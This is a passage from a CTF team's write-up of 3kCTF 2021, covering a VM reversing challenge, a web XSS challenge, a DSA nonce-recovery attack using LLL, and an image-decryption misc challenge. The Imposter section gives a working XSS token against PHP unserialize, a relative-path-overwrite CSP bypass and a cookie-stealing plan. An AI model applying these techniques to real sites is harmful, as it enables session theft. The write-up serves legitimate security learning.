06 03 03    REG[3] = MEM[3]  // REG[3] = 0x9a
03 00 00    REG[0] = ~REG[0] // REG[0] = 0x45
03 01 00    REG[1] = ~REG[1] // REG[1] = 0x6e
03 02 00    REG[2] = ~REG[2] // REG[2] = 0x74
03 03 00    REG[3] = ~REG[3] // REG[3] = 0x65
08 00 00    putc(REG[0])     // Prints &#34;E&#34;
05 00 01    REG[0] = REG[1]  // REG[0] = 0x6e
08 00 00    putc(REG[0])     // Prints &#34;n&#34;
...</code></pre></div>
<h3 id="part-iii-here-comes-the-angry-solvers">Part III. Here Comes the Angry Solvers<a hidden class="anchor" aria-hidden="true" href="#part-iii-here-comes-the-angry-solvers">#</a></h3>

<p><em>cdemirer</em> made an <em>Angr</em>-compatible version and ran against Angr. He got a flag that passes the check in no time:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">ctf{dsdsdddddddasdadsdsddaddddaddddddsddsssds}</code></pre></div>
<p>The flag is accepted in the original binary. However, the scoreboard does not accept it. What was happening? Let's look at the first instructions those are called since the binary is reading bytes (denote the bytes being <code>x0</code>, <code>x1</code>, ...) from the user.</p>
<pre tabindex="0"><code> 186 | REG[0] = getc()            // REG[0] = x0
 189 | REG[0] ^= MEM[16]          // REG[0] = x0 ^ 0x63
 192 | REG[3] += REG[0]           // REG[3] = x0 ^ 0x63
 
 195 | REG[0] = getc()            // REG[0] = x1
 198 | REG[0] ~= REG[0]           // REG[0] = x1 ^ 0xff
 201 | REG[0] ^= MEM[17]          // REG[0] = x1 ^ 0x74
 204 | REG[3] += REG[0]           // REG[3] = (x0 ^ 0x63) + (x1 ^ 0x74)
 
 207 | REG[0] = getc()            // REG[0] = x2
 210 | REG[1] = REG[0]            // REG[1] = x2
 213 | REG[0] ^= MEM[18]          // REG[0] = x2 ^ 0x8a
 216 | REG[1] &amp;= MEM[18]          // REG[1] = x2 &amp; 0x8a
 219 | REG[1] &lt;&lt;= 1               // REG[1] = (x2&lt;&lt;1) &amp; 0x14
 222 | REG[2] = REG[1]            // REG[2] = (x2&lt;&lt;1) &amp; 0x14
 225 | REG[1] += REG[0]           // REG[1] = ((x2&lt;&lt;1) &amp; 0x14) + (x2 ^ 0x8a)
 228 | REG[2] += REG[0]           // REG[2] = ((x2&lt;&lt;1) &amp; 0x14) + (x2 ^ 0x8a)
 231 | REG[1] &amp;= MEM[19]          // REG[1] = (((x2&lt;&lt;1) &amp; 0x14) + (x2 ^ 0x8a)) &amp; 0x10
 234 | REG[2] |= MEM[19]          // REG[2] = (((x2&lt;&lt;1) &amp; 0x14) + (x2 ^ 0x8a)) | 0x10
 237 | REG[1] += REG[2]           // REG[1] = ((((x2&lt;&lt;1) &amp; 0x14) + (x2 ^ 0x8a)) &amp; 0x10) + ((((x2&lt;&lt;1) &amp; 0x14) + (x2 ^ 0x8a)) | 0x10)
 240 | REG[0] = REG[1]            // REG[1] = ((((x2&lt;&lt;1) &amp; 0x14) + (x2 ^ 0x8a)) &amp; 0x10) + ((((x2&lt;&lt;1) &amp; 0x14) + (x2 ^ 0x8a)) | 0x10)
 243 | REG[3] = REG[1]            // REG[3] = ((((x2&lt;&lt;1) &amp; 0x14) + (x2 ^ 0x8a)) &amp; 0x10) + ((((x2&lt;&lt;1) &amp; 0x14) + (x2 ^ 0x8a)) | 0x10)
 
 246 | REG[0] = getc()            // REG[0] = x3
 249 | REG[1] = REG[0]            // REG[1] = x3
 252 | REG[1] ^= MEM[20]          // REG[1] = x3 ^ 0x85
 255 | REG[0] &amp;= MEM[20]          // REG[0] = x3 &amp; 0x85
 258 | REG[0] *= 2                // REG[0] = (x3 &amp; 0x85) * 2
 261 | REG[0] += REG[1]           // REG[0] = ((x3 &amp; 0x85) * 2) + (x3 ^ 0x85)
 264 | REG[3] += REG[0]           // REG[3] = ((((x2&lt;&lt;1) &amp; 0x14) + (x2 ^ 0x8a)) &amp; 0x10) + ((((x2&lt;&lt;1) &amp; 0x14) + (x2 ^ 0x8a)) | 0x10) + ((x3 &amp; 0x85) * 2) + (x3 ^ 0x85)</code></pre>
<p>Coincidentally, there is an assignment to <code>REG[3]</code> before each <code>getc()</code> operations. If we assume that those <code>REG[3]</code> to be zero, we will find something surprising. That is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">x0, x1, x2, x3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x7b</span></code></pre></div>
<p>which reads <code>ctf{</code>. Eventually, if we proceed with the assumption, we have the flag: <code>ctf{vErtu4l_m4chine_pr0tection_is_soo_2010_xD}</code>. Fixing some of the spelling mistakes we have the actual flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">ctf{v1rtu4l_m4chine_pr0tection_is_soo_2010_xD}</code></pre></div>
<div class="alert danger">
  <strong>The checks are not strict.</strong> There are non-unique solutions being accepted to the checker. Alas, the other reversing challenges we solved are checking our input in a similar fashion, too. This is not a good sign&hellip;
</div>
  

<h2 id="imposter-web-485-points">Imposter (Web; 485 points)<a hidden class="anchor" aria-hidden="true" href="#imposter-web-485-points">#</a></h2>

<p>Solved by <em>ozetta</em>.</p>

<p>I spent a lot of time in this question not because my bug-radar is not working but because of the broken bot. I have to keep being tortured by the unpleasant reCAPTCHA. I started this challenge at around 9:30 pm Saturday local time, and found the bug very quickly (?) in around 20 minutes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://imposter.2021.3k.ctf.to/view/posts.php/?token=czoyNToiPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiI7</code></pre></div>
<p>First, the token is specifying the post object created by the user. As expected the post content is sanitized. But the token handling part is funny:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_GET[<span style="color:#e6db74">&#39;token&#39;</span>])){
  <span style="color:#66d9ef">try</span> {	
    $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">base64_decode</span>($_GET[<span style="color:#e6db74">&#39;token&#39;</span>]))<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_post</span>();
  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">Error</span> $e) {
    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">base64_decode</span>($_GET[<span style="color:#e6db74">&#39;token&#39;</span>]));
  }
}</code></pre></div>
<p>It will show the unserialized object when error occurs. You know a string does not have a method called <code>get_post()</code>, right? So just serialize a string and base64 encode it as the token and make arbitrary payload. But if we use the original view post page, it will be blocked by CSP:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://imposter.2021.3k.ctf.to/view/posts.php?token=czoyNToiPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiI7</code></pre></div>
<p>which is due to the CSP created by <code>&lt;script src='../js/main.js'&gt;&lt;/script&gt;</code>. By using the Relative Path Overwrite (RPO, not ROP), we can get rid of that file. Note that both <code>view//posts.php</code> and <code>view/posts.php/</code> work, but not <code>/view/posts.php</code> because <code>/view/../js/main.js</code> = <code>/js/main.js</code> is still valid while the other two will give <code>view/js/main.js</code> instead.</p>

<p>After half an hour, I started bombard the author for the bot issue:</p>

<p><figure><img src="/images/2021-05-22-3kctf/imposter-1.png" alt=""></figure></p>

<p>OK things didn't go well. Let's try another author:</p>

<p><figure><img src="/images/2021-05-22-3kctf/imposter-2.png" alt=""></figure></p>

<p>Finally they took down the challenge to increase the resources at around 12:30 am Sunday local time. Maybe time to sleep? Well we decided to get some popcorn:</p>

<p><figure><img src="/images/2021-05-22-3kctf/imposter-3.png" alt=""></figure></p>

<p>Then I went to sleep at around 2 am. But I got woke up by my teammate later at 3:11 am to submit the payload:</p>

<p><figure><img src="/images/2021-05-22-3kctf/imposter-4.png" alt=""></figure>
🥶 Haiya time to sleep ar.</p>

<p>By the way, because the bot only accepts URL in the form <code>view/posts.php?token={...}</code>, we need to first use the meta refresh trick (which is not blocked by CSP) to kick the victim to the XSS page and steal the cookie. <em>The detailed payload is left as an exercise for the readers.</em></p>

<h2 id="digital-crypto-493-points">Digital (Crypto; 493 points)<a hidden class="anchor" aria-hidden="true" href="#digital-crypto-493-points">#</a></h2>

<p>Solved by <em>Mystiz</em>.</p>

<p>We are given the parameters for digital signature algorithm (DSA):</p>

<ul>
<li>The modulus $p$ and the generator $g$ are around 2048 bits, and</li>
<li>the order $q$ is 256 bits long.</li>
</ul>

<p>On top of that, we are also given two pairs of DSA message-signature pairs, where the private key owner signs consecutively. One point worth noticing is that they are using a hand-crafted PRNG. The PRNG is seeded by 8 bytes from urandom:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Random</span>():
	<span style="color:#66d9ef">def</span> __init__(self, seed):
		self<span style="color:#f92672">.</span>state <span style="color:#f92672">=</span> seed
		self<span style="color:#f92672">.</span>bits <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>state<span style="color:#f92672">.</span>bit_length()

	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">next</span>(self):
		self<span style="color:#f92672">.</span>state <span style="color:#f92672">^=</span> self<span style="color:#f92672">.</span>state <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">76</span>
		self<span style="color:#f92672">.</span>state <span style="color:#f92672">=</span> rol(self<span style="color:#f92672">.</span>state, <span style="color:#ae81ff">32</span>, self<span style="color:#f92672">.</span>bits)
		self<span style="color:#f92672">.</span>state <span style="color:#f92672">^=</span> self<span style="color:#f92672">.</span>state <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">104</span>
		self<span style="color:#f92672">.</span>state <span style="color:#f92672">=</span> rol(self<span style="color:#f92672">.</span>state, <span style="color:#ae81ff">20</span>, self<span style="color:#f92672">.</span>bits)
		self<span style="color:#f92672">.</span>state <span style="color:#f92672">^=</span> self<span style="color:#f92672">.</span>state <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">116</span>
		self<span style="color:#f92672">.</span>state <span style="color:#f92672">=</span> rol(self<span style="color:#f92672">.</span>state, <span style="color:#ae81ff">12</span>, self<span style="color:#f92672">.</span>bits)
		<span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>state


random <span style="color:#f92672">=</span> Random(int(os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>hex(), <span style="color:#ae81ff">16</span>))</code></pre></div>
<p>Since their PRNG involves of <em>xor</em>'s and <em>rol</em>'s only, we can express the current and the next states (denoted by $k_1$ and $k_2$) explicitly:</p>

<p><span  class="math">\[\begin{aligned}
k_2 &= \text{ROL}(k_1, 64) \oplus \text{ROL}(k_1^{52..0}, 12) \oplus \text{ROL}(k_1^{24..0}, 32) \\
&\qquad \oplus \text{ROL}(k_1^{20..0}, 36) \oplus k_1^{88..76} \oplus k_1^{12..0}
\end{aligned}\]</span></p>

<p>We can visualize the components for the next state in terms of the current state. We can see that $k_2^{128..64} = k_1^{64..0}$. That said, $k_1$ and $k_2$ share 64 bits of entropy, and they have 192 bits entropy in total.</p>

<p><figure><img src="/images/2021-05-22-3kctf/digital-random-states.png" alt=""></figure></p>

<p>In that way, we can write $k_1 := 2^{64} u + v$ and $k_2 := 2^{64} v + w$. Also, we have two pairs of message-signature pairs: $m_i$ and $r_i, s_i$'s which satisfy the below congruence (here $x$ is the secret flag):</p>

<p><span  class="math">\[k_is_i \equiv h_i + xr_i\ (\text{mod}\ q).\]</span></p>

<p>We can eliminate $x$ by multiplying $r_2$ on the both sides of $k_1s_1 \equiv h_1 + xr_1$ and multiplying $r_1$ on $k_2s_2 \equiv h_2 + xr_2$. Eventually we can form a large congruence under modulo $q$:</p>

<p><span  class="math">\[k_1s_1r_2 - k_2s_2r_2 \equiv h_1r_2 - h_2r_1\ (\text{mod}\ q).\]</span></p>

<p>In that way, the only unknowns are $k_1$ and $k_2$. Substituting $k_1 = 2^{64}u+v$ and $k_2 = 2^{64}v+w$, we have</p>

<p><span  class="math">\[2^{64}s_1r_2u + (- 2^{64}s_2r_1 + s_1r_2)v - s_2r_1w \equiv h_1r_2-h_2r_1\ (\text{mod}\ q).\]</span></p>

<p>We can construct a lattice and use the LLL algorithm to find short vectors. The vector we want is $(0, -1, u, v, w)$.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">b <span style="color:#f92672">=</span> h1<span style="color:#f92672">*</span>r2 <span style="color:#f92672">-</span> h2<span style="color:#f92672">*</span>r1

a0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">64</span> <span style="color:#f92672">*</span> s1<span style="color:#f92672">*</span>r2
a1 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">64</span> <span style="color:#f92672">*</span> s2<span style="color:#f92672">*</span>r1 <span style="color:#f92672">+</span> s1<span style="color:#f92672">*</span>r2
a2 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>s2<span style="color:#f92672">*</span>r1

A <span style="color:#f92672">=</span> Matrix(ZZ, [
	[ b, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], <span style="color:#75715e"># &lt;- -1</span>
	[a0, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], <span style="color:#75715e"># &lt;- u (64 bits)</span>
	[a1, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>], <span style="color:#75715e"># &lt;- v (64 bits)</span>
	[a2, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>], <span style="color:#75715e"># &lt;- w (64 bits)</span>
	[ q, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], <span style="color:#75715e"># *</span>
])
Q <span style="color:#f92672">=</span> diagonal_matrix([<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>])

A <span style="color:#f92672">*=</span> Q
A <span style="color:#f92672">=</span> A<span style="color:#f92672">.</span>LLL()
A <span style="color:#f92672">/=</span> Q</code></pre></div>
<p>We are able to retrieve the flag with the above Sage snippet - and we agreed that we should not roll our own PRNG algorithms.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">3k{Why_roll_your_0wn_random_???}</code></pre></div>
<h2 id="mokdads-memories-misc-498-points">Mokdad's Memories (Misc; 498 points)<a hidden class="anchor" aria-hidden="true" href="#mokdads-memories-misc-498-points">#</a></h2>

<p>Solved by <em>TWY</em>.</p>

<h3 id="part-i-analysis-1">Part I. Analysis<a hidden class="anchor" aria-hidden="true" href="#part-i-analysis-1">#</a></h3>

<p>We are given a Python source code that takes <code>el_mok.png</code> as the input and outputs an image named <code>brain_memory.png</code>, and a remote service <code>nc mokdadkey.2021.3k.ctf.to 1777</code>.</p>

<p>As the source code states that the dimension of <code>brain_memory.png</code> is $887\times499$, while the given <code>brain_memory.png</code> is $887\times22$, probably something has been done to the original <code>brain_memory.png</code>.</p>

<ul>
<li>It may be a cropped part of the &quot;brain memory&quot;, or</li>
<li>The dimension may be corrupted, or</li>
<li>Other reason(s) that needs further investigation</li>
</ul>

<p>In either of the first two cases, we know that the relative offsets between the pixels of the visible parts ($887\times22$) are fixed.</p>

<div class="alert info">
  <p>Since the given <code>brain_memory.png</code> can be loaded in MSPaint, but result in Internal Error in SAI2, we can deduce that the file has some sorts of errors.</p>
<p>To allow the file to be loaded by Python PIL library properly, we can use some more tolerant image editing software (e.g. <code>GIMP</code> / <code>paint.net</code>) that preserves transparency to open the file, then export to another <code>png</code> file for our use (suppose that the challenge does not have steganography involved, as stated in <code>Home - About</code>).</p>

</div>
  

<div class="alert warning">
  This <code>png</code> file exported has much smaller size (About 76 KB) than the original file (About 1.7 MB), and $\frac{1.7 \text{MB}}{76 \text{KB}} \approx \frac{499}{22}$, maybe we can confirm something&hellip;?
</div>
  

<h3 id="part-ii-reversing-the-source-code">Part II. Reversing the Source Code<a hidden class="anchor" aria-hidden="true" href="#part-ii-reversing-the-source-code">#</a></h3>

<p>Since the source code is given, we can try to reverse all the steps to obtain part(s) of the <code>el_mok.png</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Source</span>
fffmok<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#34;brain_memory.png&#34;</span>)

<span style="color:#75715e"># Reverse</span>
fffmok <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;brain_memory.png&#34;</span>)</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Source</span>
fffmok <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;RGBA&#34;</span>, (<span style="color:#ae81ff">887</span>, <span style="color:#ae81ff">499</span>))
pixels <span style="color:#f92672">=</span> fffmok<span style="color:#f92672">.</span>load()
itr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">887</span>): <span style="color:#75715e"># Brain of Mekdad is so old not knowing how to save his memories :-(</span>
    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">499</span>):
        pixels[y, x] <span style="color:#f92672">=</span> fffmok_pixels[itr]
        itr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>

<span style="color:#75715e"># Reverse</span>
fffmok_pixels <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">887</span>):
    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">499</span>):
        fffmok_pixels<span style="color:#f92672">.</span>append(fffmok<span style="color:#f92672">.</span>getpixel((y, x)))
        
<span style="color:#75715e"># or shorter:</span>
fffmok_pixels <span style="color:#f92672">=</span> [fffmok<span style="color:#f92672">.</span>getpixel((y, x)) <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">887</span>) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">499</span>)]

<span style="color:#75715e"># or even:</span>
<span style="color:#f92672">from</span> PIL.Image <span style="color:#f92672">import</span> TRANSPOSE
fffmok<span style="color:#f92672">.</span>transpose(TRANSPOSE)<span style="color:#f92672">.</span>tobytes()
<span style="color:#75715e"># notice that this method produces a byte-string instead of a tuple array, so there are some changes needed in order to have the solve script compatible with this.</span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Source</span>
key <span style="color:#f92672">=</span> bytes_to_long(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;REDACTED&#34;</span>) <span style="color:#75715e"># Mekdad will give you the key</span>
fffmok_pixels <span style="color:#f92672">=</span> []

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(ffmok_bytes) <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">8</span>):
    p <span style="color:#f92672">=</span> bytes_to_long(ffmok_bytes[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>])
    v <span style="color:#f92672">=</span> (key <span style="color:#f92672">^</span> p) <span style="color:#f92672">%</span> <span style="color:#ae81ff">18446744073709551615</span>
    o2 <span style="color:#f92672">=</span> v <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
    b2 <span style="color:#f92672">=</span> (v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
    g2 <span style="color:#f92672">=</span> (v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
    r2 <span style="color:#f92672">=</span> (v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
    o1 <span style="color:#f92672">=</span> (v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
    b1 <span style="color:#f92672">=</span> (v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">40</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
    g1 <span style="color:#f92672">=</span> (v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">48</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
    r1 <span style="color:#f92672">=</span> (v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">56</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
    fffmok_pixels<span style="color:#f92672">.</span>append((r1, g1, b1, o1))
    fffmok_pixels<span style="color:#f92672">.</span>append((r2, g2, b2, o2))

fffmok_pixels<span style="color:#f92672">.</span>append(tuple(ffmok_bytes[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:]))</code></pre></div>
<p>This part transforms the bytes using the xor-mod operation using the key.</p>

<p>For the key, it states that <code>Mekdad will give you the key</code>. So we should use the netcat service to ask Mekdad for the key.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ nc mokdadkey.2021.3k.ctf.to 1777
My number &#39;n&#39; is 1 &lt;= n &lt;= 168
You have 8 tries to guess the right number!
Guess&gt; 84
My number is smaller than 84
Guess&gt; 42
My number is smaller than 42
Guess&gt; 21
My number is smaller than 21
Guess&gt; 10
My number is smaller than 10
Guess&gt; 5
Correct, Me Mekdad Shili the President of the Artists Syndicate!
As promised here is my secret: &#39;_D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_&#39;</code></pre></div>
<p>A simple binary search can solve this, as the number of guesses allowed seems to be calculated by $\lceil \log_2n\rceil$.</p>

<p>So here we obtained the key: <code>_D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_</code>. (without the single quotation marks, can be confirmed in later stage if we find the final image looks like random noises).</p>

<p>The next problem is to reverse the <code>v = (key ^ p) % 18446744073709551615</code> part, where $18446744073709551615 = 2^{64}-1$, and $p$ is 64-bit.</p>

<p>Which means that $\text{key} \oplus p$ only differs from $\text{key}$ in the lower 64 bits. Therefore, the lower bound of $\text{key} \oplus p$ is the result of changing all the lower 64 bits of $\text{key}$ to 0.</p>

<p>Since $v$ is the given remainder after the modulo operation, so $\text{key} \oplus p$ should be the next number $\geq$ lower bound that have a remainder of $v$ after divided by $18446744073709551615$. (Actually there are two possible $p$'s if the lower bound satisfies $v$ (then the upper bound also), but the probability is neglectably low so we can just ignore that :) )</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Reverse</span>
key <span style="color:#f92672">=</span> bytes_to_long(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;_D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_&#34;</span>)
key_mask_length <span style="color:#f92672">=</span> (<span style="color:#ae81ff">18446744073709551615</span>)<span style="color:#f92672">.</span>bit_length() <span style="color:#75715e"># 64</span>
key_low64 <span style="color:#f92672">=</span> key <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> key_mask_length <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
key_mask64 <span style="color:#f92672">=</span> key <span style="color:#f92672">^</span> key_low64

ffmok_bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(fffmok_pixels) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>):
    r1, g1, b1, o1 <span style="color:#f92672">=</span> fffmok_pixels[i]
    r2, g2, b2, o2 <span style="color:#f92672">=</span> fffmok_pixels[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
    v <span style="color:#f92672">=</span> bytes_to_long(bytes([r1, g1, b1, o1, r2, g2, b2, o2]))
    p <span style="color:#f92672">=</span> ((key_mask64 <span style="color:#f92672">-</span> (key_mask64 <span style="color:#f92672">-</span> v) <span style="color:#f92672">%</span> <span style="color:#ae81ff">18446744073709551615</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">18446744073709551615</span>) <span style="color:#f92672">^</span> key
    <span style="color:#75715e"># assert (p ^ key) % 18446744073709551615 == v</span>
    ffmok_bytes <span style="color:#f92672">+=</span> p<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)

ffmok_bytes <span style="color:#f92672">+=</span> bytes(fffmok_pixels[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Source</span>
fmok_bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(map(bytearray, fmok_pixels))
k <span style="color:#f92672">=</span> (int(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([hex(_)[<span style="color:#ae81ff">2</span>:] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> iv]), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">**</span> <span style="color:#ae81ff">4</span>)<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">32</span>, <span style="color:#e6db74">&#34;little&#34;</span>) <span style="color:#75715e"># b&#39;\x10\x82u\x98:\x1c\x0fy\x10/4{\xd8\xc3\xa9u\xe3x\x8a\x9d3ru\xc1\x93\xf5i\x8c6\xdf\x15\x01&#39;</span>
iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xbb\x9c\xe2\x8d\xd0\xd1\xbe</span><span style="color:#e6db74">@</span><span style="color:#ae81ff">\xf6</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\x02\xc9</span><span style="color:#e6db74">5</span><span style="color:#ae81ff">\x15\x1c</span><span style="color:#e6db74">F&#39;</span>
aes <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(k, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
ffmok_bytes <span style="color:#f92672">=</span> aes<span style="color:#f92672">.</span>encrypt(fmok_bytes[:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>]) <span style="color:#f92672">+</span> fmok_bytes[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:]

<span style="color:#75715e"># Reverse</span>
